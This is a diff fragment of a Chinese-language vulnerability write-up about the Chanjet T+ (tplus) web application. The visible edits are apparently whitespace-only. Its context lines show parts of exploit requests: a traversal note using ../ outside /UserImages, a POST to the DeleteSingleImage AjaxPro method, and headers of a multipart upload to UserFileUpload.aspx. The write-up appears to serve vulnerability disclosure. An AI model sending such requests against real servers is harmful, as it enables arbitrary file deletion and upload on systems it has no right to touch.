@@ -73,7 +73,7 @@ Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8
 Cache-Control: no-cache
 Connection: keep-alive
 Content-Length: 56
-Content-Type: application/json
+Content-Type: application/json
 Host: 127.0.0.1
 Origin: http://127.0.0.1
 Pragma: no-cache
@@ -95,7 +95,7 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 
 **![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dXsakIibgqjnyJch7vrVjOwayJnDknkqG0zuXNcVq9EzsbGaqEzp91xlPkSgOZBFHtEwvMPhHeJUw/640?wx_fmt=png)**  
 
-**经检查发现删除目录为 /UserImages 使用 ../ 可进行跨目录 **Payload:****
+**经检查发现删除目录为 /UserImages 使用 ../ 可进行跨目录 **Payload:****
 
 ```
 POST /tplus/ajaxpro/Ufida.T.EAP.Voucher.WebController.AjaxImageService,Ufida.T.EAP.Voucher.WebController.ashx?method=DeleteSingleImage HTTP/1.1
@@ -201,10 +201,10 @@ Connection: keep-alive
 Content-Length: 775
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMXNLGZirKX5UAvYG
 Cookie: LOGIN_LANG=cn; ASP.NET_SessionId=oafhmiapxpe5vqesdwm4oms5; Hm_lvt_fd4ca40261bc424e2d120b806d985a14=1674191380,1674378083,1674393050,1674536169; Hm_lpvt_fd4ca40261bc424e2d120b806d985a14=1674543095
-Host: 127.0.0.0
+Host: 127.0.0.0
 Origin: http://127.0.0.0
 Pragma: no-cache
-Referer: http://127.0.0.0/tplus/CommonPage/UserFileUpload.aspx
+Referer: http://127.0.0.0/tplus/CommonPage/UserFileUpload.aspx
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
 ----WebKitFormBoundaryMXNLGZirKX5UAvYG
